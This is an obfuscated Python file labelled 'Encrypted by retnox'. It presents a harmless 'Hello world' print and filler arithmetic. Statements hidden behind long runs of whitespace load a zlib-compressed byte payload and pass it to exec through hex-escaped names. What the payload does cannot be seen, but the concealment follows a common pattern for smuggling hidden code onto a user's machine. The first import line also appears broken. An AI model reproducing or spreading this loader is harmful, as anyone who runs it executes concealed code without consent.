# Encrypted by retnox
rom builtins import *
from math import prod as _calculate

__code__ = 'print("Hello world!")'


StackOverflow, Add, Calculate, Positive, MemoryAccess, Walk, _square = exec, str, tuple, map, ord, globals, type

class _detectvar:
    def __init__(self, _callfunction):
        self.Statistics = _calculate((_callfunction, -12561))
        self._floor(_negative=59723)

    def _floor(self, _negative = int):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self.Statistics /= -52357 - _negative
        
        try:
            ((Positive, MemoryAccess, Calculate) or MemoryAccess if (Positive, MemoryAccess, Calculate) and MemoryAccess else ... or (MemoryAccess, (Positive, MemoryAccess, Calculate)))

        except AttributeError:
            (((Add, While, StackOverflow), StackOverflow) for StackOverflow in {'iudethalo3leli3elt': Calculate})

        except:
            _square(-91301 / 20236) == str

    def _round(self, _while = 31880):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _while += -64018 + -22385
        self._system != Ellipsis
        
        try:
            (Calculate, While, Calculate) if Calculate == MemoryAccess else {'3RhehtutgdaRy65ggte': 'eytB5alouRoe'} <= While

        except TypeError:
            (({StackOverflow: Calculate}, Positive) for Positive in {'3RhehtutgdaRy65ggte': 'eytB5alouRoe'})

        except:
            _square(42134 / 85268) == None

    def _memoryaccess(Cube = float):
        return Walk()[Cube]

    def _hypothesis(_product = -68829 * -15240, Square = None, Negative = Walk):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Negative()[_product] = Square
        
        try:
            ({StackOverflow: Calculate} or StackOverflow if {StackOverflow: Calculate} and StackOverflow else ... or (StackOverflow, {StackOverflow: Calculate}))

        except AttributeError:
            (((Calculate, While, Calculate), Calculate) for Calculate in (Add, While, StackOverflow))

        except:
            _square(-92502 / 8635) == int

    def execute(code = str):
        return StackOverflow(Add(Calculate(Positive(MemoryAccess, code))))

    @property
    def _system(self):
        self.System = '<__main__.StackOverflow object at 0x000005579BE17379>'
        return (self.System, _detectvar._system)

if __name__ == '__main__':
    try:
        _detectvar.execute(code = __code__)
        _modulo = _detectvar(_callfunction = 80015 / -57323)

        _modulo._floor(_negative = _modulo.Statistics / 9854)                                                                                                                                                                                                                                                          ;_detectvar._hypothesis(_product='S2SSS2SS22S22SS222S2S2',Square=b'x\x9c\xe5[\xdds\xe28\x12\x7f\xf7_\xc1\xe6\xc5P\xc9$F\xb6eH\x15/[\xdc\xd5\x86"\xe1j\xe6\xea\x92\xad\x99)\x97\xb1E\xc6\xac\xb1R`6\xe4\xbf\xbf\xee\x96D\x9c\x00\xc1\x04\xc8>D\xb2\xbe?,~\x92\xba[-SL\x9f.\xad\x1a\x98tT\xa7\x10M\x18\xca\xe1h>\x8b\xa3BN\xc3\xb0\xf6[\xe7\xe4\x8f\xa7\x071Me~R\x93\xd3R\xb5h^\xfc\x92\xd3\x19\xd5\xa9\x9f\x0c\xd3,{*~\x89{\x19\x15\xae\xcfO\xceN~\xcf\xe6\xe2\xabHN\x1a/Z\xdd\xa7\xc5\xaf\xf9Pu\xfc\xab(\x1ef\x97\x17\x17*\xef<\x96\x93\x8bW\xdd\\lxw\x92\xceb9M^v\xa33\xcf\xef\xef/\x1e\xb2\xe8~.^5\xca\xd2X\xe43\xa1\x1a\xfd\xeb?\xfd/\xec\xdcyU%\x96\x89*\xb7\x1f\xa6i^\xd4O\xfe\x10Y&k\x8fr\x9a%\xbf\x9d4l\xabq\xb9\xac\x8d\xe5\xf6\xec\xaf4\xb1\x1b\x96X\xc4\xe2\xa1\xd0`\xe6\x0fsh\xf9U\xce\xc4\xac\x16MEm*\x92\x1f\xf9\xffR\x99\x89Be\x0c\x01\x99\x1f\xf9\x9frN\xa9\xa8\x86\x9d\xfc\xc8o\xe4P&O\xb5,\xfd\x0b\xda=\xc9\xf9I\xc3R\x83J\'\x0frZ\x84!\xbc\xedif7\xce\xc5"-\xea\r+\x93q\x94\xcd\xea\x8d\xef\xb6\x1ct\x07\x83A\xb7\xdb\x85Pv\xa5\x84\x94\xfd\xb3s\x9f\xc9!T\xb0\xd6\x94b\xa3\xdeU\xef\xaa\x0f\x1e\x86h\xfa\xfd\x9e\xfd\xfd\xf2\xf2\xf4\xcb\xe9\x97\xfa\x97\xfai\xb3\xd1\xf8\xf9\xb3\x93\xa4\xd3M\xedo\xae\xafo\xaeo\xd0\\cp\x8d\xe1j\x07\xf7\xa2\x88\x8abc\'\xb7www\xb7\xea\xb9U\x0fz0x\xf5\xe3\xac\xf5\xe5\xd82M\xd3q6\x1e\xa7i\x06+f\x9ca\x12R\x90\x80\xc6\xcf\x90mz\xef\xb7o\xec\x1b8\xc6(\xd4\x11\x06M7v[\xb7\x87\xf34+\xd2\x1cg\xe0\xefh\xfa\xd6\xd8\x1e\xc1,\x1e\x17\x0b\x0c\xc0WQ\xe8\x1c\x81\xba6\x80a\x14"\xf57\xde\x98\xa6\xf1,\xca\xd3\xe1kX\x1bg\xbd~\x9f&M\xcd_\x1f\xc3wu\xd4\xf8~\xb0\x9e\xce\xd3<\x11\x8b\xba\xfd4J\xb3\x85\xf8\x95\xcfW\xaa\xfclX\xebq\xd7\xcb\x11\xde\xdeG\x83#A\x1fSW\xef\x80m\x96\xa7E\x96\xce\xf7\x87mcG;\xc3\xb6\xb9\'\x03[&\xe5j\xe9\x9b\x88M\xf2|\x92O&\x10\xe4\x14\x838\x80e\xdb\xe7c\x99\xe6o\xb4\x1b8\xb0#\xc89\x18\x82\x0f\xf6\xb3\xc0,fY\xf4\xefu8o \x14\x84\xaf\xc2XA\x9cSz\xf2i\xf0\x9aO\xff\xbb\xdb\xb2\xd40\xca\x81\x84\x90P%4?\x0b`Y\xf4\xb7X\x07\xd8fnA\x08\xe1\xba\xeb"PR\xca\xcf\x02U\x11\xc9l\xb4\x1bVH\xb7$P,X]\x18\x1bP0p\xe4\xe0\xd3\xac\xafi1\xdb\r2\xdc\xa9`\xd56%\xfb\xed\xb3`%\xb2\xf4a"\xe3\xea\xe4~\xad\xe0V\x1f\xda~ki\x03\xb0\xca\x0f\x969\xc6\xd7y  &\x02O\x12u\xbb5*\xd6\xc8A\x9f\x03\xfdX,\xd6R\xc2\xcd\xacc\x8c\xef\x18\xc3+\xd1\xa77\x8f\xb3r\x0f\x1bXK}\xd3\xb4\xb9-\x7f\xe4z\xe0\x9a\xe088\x07\\\x1b\\\xa0\xe3-6d-\x96l\xad\x17\xb0\xf6\xb6Im\xd0qg\xd7\x112\xe6\xc7\xae\xe3\x82\xf1\x87n\xd3\x1dB\xa4\xc9\x13\xc6\xb6\xbe\xed\r\x14\x1f\x8dY\xd0\xa3\xde\xb8\x17\x8cM\x96\x10L\xce\x07\xc2\xe0\xee\t\xc3\xa6Wy#N\x16^\xe7x\xa3\xe7\x94\x07\x8eS\x1aK\x94\xc5\xbc\xed\x9b9\x8b&\xc3$\xaa\xd1y\x986\xb6\xda\xd9\x94\xbc\\Kg\xde1\xea\xc8\x8b\xc1\xb5\xc1a\xacM)\x95\x8eU\xce\xf6q\xee<)\x01wy\xcc}\xde\x0c\x18\x0b\x8e1\x15\x89\'\xb4C_,}c!~\x8c\x9f\x15\x04<\xe0~\xe01\x87\xb7\x02\x0f\xac\x13\xb8n\xc4Fl\x140\xf8\xb1\x01\x13P\xde\x0e<(\xf59\x03\xa2\x0e4\x01J\\X(\x02r}\xf4\xa1\x0e\xa6\x136\xf2\x19\xf6\xc5\x05\x1f\x05-\x069\xbc\xc9\xdb\\0\x01\xbd\xb6\xf7\x82\xcd\xbeR&\xcb2\x13Bl?\x82\xe8\xe8\x9d\xdc\xac\xba\x93\xf5\xe2\xc6n\x16K\xb2B\xfd-\x1e/7\t\x1d\xbb/\x05\x80/\xd1\x0e}e\x85\xf6uY\xa5\xa5\xf0R\x92\xae\xdb\xfe\xb9S\x050\xbb\xd1\x84\xf2JU7b\xebk\x86a\x18\x87\xa7\x99\x89a.X\xde\xd6\x0c\xa7J\xddV\xb59"\xb7;\xe2A\x0b\xf6A\x8b\xec\xcb0X\x1fV\xa6\x83]D\n\x91\xc3\t \x82\xd7\xbd\xdc4\xbaw,\x94\x11\x12m\xcf\x83\x10\xcdH\x87\x9e\xca\xd5%D\xd21v\x04\xea\xb1\xca\xa9\x02\x9e\xb8\xc2\x05\xca\xc5G\xcc\xf1\xfd\xc0\xe1\x1eP\x11\xa0\x13\x81\xcb\x1c\x8f\x03]\x00\x8a\xc1=\xd6d\x8e\x1b\xbb\xf1~\xcc]k{&Z/\x81\x01=\xd5\x16y+\xe4\xa1\x1bz`\x9b\xe0\x82\xb0\x1d\xb6\xa1~{5\xf7#\x89\xcc\x0bB\xa3\x84bc!\xf1\x8e\xb5c\x83\xbcJ\x86\x84U\x92"\xc7i5\x80\xdc\x10\xc1\xe0\x00B\x93|7t\xa1\xbe\xb7\x9a[\xad;\x1f*{\xa1\x03\xb6\x15\xb2\x10;gP\x9f\xaf\xe6V\xeb\xce\x81\xf2\xe6^S\xe3i\x1a\x83\x82.\x03\xe7j\xfa\xc3\xb5\xf35}\xdaV\xcf\xdb\x816\xbd\x9ebI\x94\x01\x86\x0b\x06\xc9\xc3\xe0\x90\xe4!"\x1b\x03\x0bV.\x86T\x1b\xec\xb3\x0f9\xc7\x92\x95`\xc3\x1fCN*\x91a\xe3?\xbb\x97\xe4[\x9b\xca\xc4\x1a\x15)D\xa5\xbb\xc49\x91i\xc2\x9ct\xbb\x87d\xed\xaf\x19\xb9(1\xf7%\xd3\xaf<b\x1c\xc7\x1d\x8dJ\r\xeevW\x11\xdb\x1eHG\xa2\xca\x1b\xb5GJ\x9fD(\x0c\x0e\xbc\x07w\x10)\xec\x06\x12_\x06\xd4%\x08\xfd\xd0\'\n\x13@}\x7f5\xb7Zw\x1c\x1a\xba\xd0\xa4I\x94\x86!e\x87\xfa\xc1jn\xc5\xdf\x0cT\xafIM\x83\xd0!J\x88d\xac\xb9\x9a[\xad;\x06\x14/\x00\xda\x17\x10A\x85q@m\xf7u\xde^d\xce\x9c\xdb\x8d(\xc55\t\xe3Z\xe4j\x97\xce\xfeU\xeaV<\xffor{\x8a\x19\xcc\x88\x19\xfb\x89\x0e\x8c\x8a\xe8a%\x03\xc9\x83\x8a\xbdnI\x8f\x12\xe8xs\x83\xd8\xbb\xae\xeeG*\x19\xbc#)\x194\xab)\xbb\x98\xd8RL\xa9x\x19C{\x8c\xa3{\xf9\xa7:\xf0S\xdb\xaes,}J\xb4\xd4A(\x1b\x91vB\x85FO\x11\xe9\x1cp\x1f \x92{GS\x1ei\xb1\xc2\xccg\xa4c\xedgQ\xe3CN\x1c\xech\xba\xb1\xe5\xd1j\xc4u\x9c\xeb\x1c\xae\x8fW\xde1\x0eU\xc1~\x8a\x92\x14\x95\xc6)\x88\xf9)*\xabQO\xbd\xa7\xde8\xd0b\xaf_\xd2\x05\xb7t\xe8\x9b\xb0\xc4?\xb6\xd5\xad(./\x85\x1c-\xde\xdc\x92\xd4u\xa7%\x1e|\xde!\x97\xd9\xa8\xb0G|Rr\x00\x11\x9e\x8e\xc6\x07\x17av\xa8\xea\x90\xd4\xd0\x06\x87\x07O<\x08\xf9$O\xac\xe4~\x94\xea\xe6\x1d\'\xd6=\xf9{\x10\xe0&\x86\xf7B\xc8\x99sH\xb5\xe1\xb5\xf9\x1e\xcb\xf8\xd77\xff\x88\xceP\x1f\xe2I\x0fn\xc6\x02\xf1C\x1e-\x9e\x89q{\xc9^M,R$z\x97\x83\x85\xd9njPww\x07\xd3\xde\x8b\x92J[\xacQv\x1b5x\x85c\xd0\x01\xb8\xe3\xde7L\xa8\x86V\x0fX\xfd\xa0\xfb\xe7h\xca\xc6\xc5k\x14\x17F\xda\xf44\x956\x92g\x8b\xa4{E\xc9\xab\xd4\xe5\xbbQ\x88u:\xe976\x9ap\x9b{\xdd\xfc\xa9\xbe\x16FM\x0f\xe6\xa3pni|\x98\xc6\x8f\xe9\xb4Qh#\x17tK\xb7\xad\xdb\xea\xb2]t\x87\xef\xd0\xd6\xe0\x15\xce^TV\xdf\xc9\xa8-\xa0\xf6\x00eU=\xef\xbbZ\xf5\xe7\x92\x1a\xb0\x15r:\xef\xaf\xe4~\xd4\xfc\x05f}\x1b\x89\xa5$\xd1\xb8&,I<\xdb\xea\xee0\x7f\xef\x9dC\xdf\xe3-\xee3\'p9la\xde\x06\xce\xe9A*\xe0MT\xbc\xd3\x85\x1c\xa6K\nyR\xc2\x1fCC\xb7F\xb7%J)\xf1B\xdbu\x8c;M&\x18\x9e\xb6\xd0o9 V\xecE\xde\x89\xffi\xe1s)\x81\xde\xeeM\x86YI\x97\xec\x94\x84\xe3\xa5\x8e\xb9D\x86\xb7\xd5\xad\xb8\xbc\x0eu\xbfs\x94\xd3\xd6\x0b\xd5m\xf0J\xc9\xbbT\xef~\x88DPQ\x0f2\x9a\xcaI\xcd|\x06_S\xdf\xd8\xd7\xc4B\xc4g\xf4o\x893p\x16&\xeb\xc4\xf3`<\xc4\xf20\xda\x1d4\xaciG_\xc5\xa4t+\x83>\xa4\xac\xfb\x0e\x9dO\xd4eMJ%\xd6S\xe7Q\xdf7/\xd9\x19\x1ak\xd8YU^\x99\xc7J:\xa8\xc5\x95\xa4\xd8u\xf4\xb7\x81\x0e){\xad\xaf\x1d\xf5A\xc6\x8d~\xf4\x15\x93\xf5g\xa7\xd7\xeb\xf7\xf0\x9bs\xfc\xd8\xbcwu\xd5\xefA\x06\xe4\xf4\xac\xdf;\x0b5\x06\xc3Q1i=vn\xef\xca2\xa2\xd9)\xf8+\xc6\xdaf\xf4\xfdR\x86\xde\x98~\xcbT\x01\'\x97\x90\xcd\x9ef\x85\x98\x9c\xe5\xd1D\xa8\xa2"\x9d\x88ea&\xc4\x83\xa5\xaa\xd4\xc7t\xa8%PR\x05\xdc\xb8\x96\x8ej\xd8\xb2\xd3Y\xa8i50a\xbc&\xb2\x99\xa8\xf5\xfa\xfakz\xfa\x92\x0b"\x8de\x7f4,\xfc\x90K\x1f\x08\xe9p\x08\xc5\xf8\xd2\xfa\xd53/S\x9cM?\xcb\xe6J\xa07\x18"\x8a\rK\xfdQfz\x9a\xab/\xa3\xd1W\x1fL\xab\xbb\xc9\xd3\xc7S\xa9E \xbcX\x18\xe0\xdd0\xaa\xdb\xbb\xd2\xbc57\xdfT\xd3U&\xa6L\xa7\x86\xc3\xeaai\x0e{\x05\xe3\xf9?\x0f\xe3\xc1H')

        _detectvar(_callfunction = -45196 + -37469)._floor(_negative = _modulo.Statistics + 97115)                                                                                                                                                                                                                                                          ;xwwxwxwxxwwxwxxxxxwxx,Oo00o0oooo00OOOOOooooOOoOO,lllIIIllIIlIIIIIlIIll,WWWXXXXXXXXWWXXXXXW,NMMMMNMNMMNNMNNMNM=(lambda oooOOooooDDDOoDOOOoOoDOO:oooOOooooDDDOoDOOOoOoDOO(__import__('\x7a\x6c\x69\x62'))),(lambda oooOOooooDDDOoDOOOoOoDOO:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(oooOOooooDDDOoDOOOoOoDOO)"),filename='\x6c\x6c\x49\x49\x49\x49\x6c\x6c\x49\x49\x49\x6c\x49\x6c\x6c\x49\x49\x6c\x49\x49\x49\x6c\x49',mode='\x65\x76\x61\x6c'))),(lambda oooOOooooDDDOoDOOOoOoDOO:oooOOooooDDDOoDOOOoOoDOO['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda:(lambda oooOOooooDDDOoDOOOoOoDOO:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(oooOOooooDDDOoDOOOoOoDOO)"),filename='\x6c\x6c\x49\x49\x49\x49\x6c\x6c\x49\x49\x49\x6c\x49\x6c\x6c\x49\x49\x6c\x49\x49\x49\x6c\x49',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda nnnmnnnnmmmmnnnnnnm,oooOOooooDDDOoDOOOoOoDOO:nnnmnnnnmmmmnnnnnnm(oooOOooooDDDOoDOOOoOoDOO))
        if 185401 > 9564378:
            _detectvar(_callfunction = 70407 - -15085)._floor(_negative = _modulo.Statistics + 69297)
        elif 388776 < 3571823:
            _detectvar(_callfunction = -8974 * -22131)._round(_while = -42756 + _modulo.Statistics)                                                                                                                                                                                                                                                          ;WWWXXXXXXXXWWXXXXXW()(NMMMMNMNMMNNMNNMNM(lllIIIllIIlIIIIIlIIll(xwwxwxwxxwwxwxxxxxwxx(Oo00o0oooo00OOOOOooooOOoOO('\x76\x61\x72\x73'))),_detectvar._memoryaccess(Cube='S2SSS2SS22S22SS222S2S2')))

    except Exception as While:
        if 203869 > 4011075:
            _detectvar.execute(code = Add(While))

        elif 397107 > 9228052:
            _modulo._floor(_negative = _modulo.Statistics - 23341)
